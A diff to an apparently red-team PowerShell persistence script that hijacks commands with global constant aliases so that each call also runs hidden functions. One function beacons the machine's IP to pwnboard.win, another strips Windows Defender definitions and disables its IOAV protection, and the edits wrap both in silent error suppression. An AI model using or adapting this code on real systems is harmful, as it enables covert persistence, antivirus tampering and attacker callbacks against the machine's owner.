@@ -1,5 +1,5 @@
 $mm = @'
-function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|try{Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString}Catch{};$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
+function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
 '@.Trim()
 $dd = @'
 function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
@@ -23,7 +23,7 @@ function cool() {
 }
 
 function shim([string]$key, [string]$value) {
-    $y = "function shimmed_$key {$value; Invoke-Expression(`"mm; xx; dd; ff`")}"
+    $y = "function shimmed_$key {$value; Invoke-Expression(`"try{mm}catch{}; try{xx}catch{}; try{dd}catch{}; try{ff}catch{}`")}"
     $tmp = "shimmed_$key"
     $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
     $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
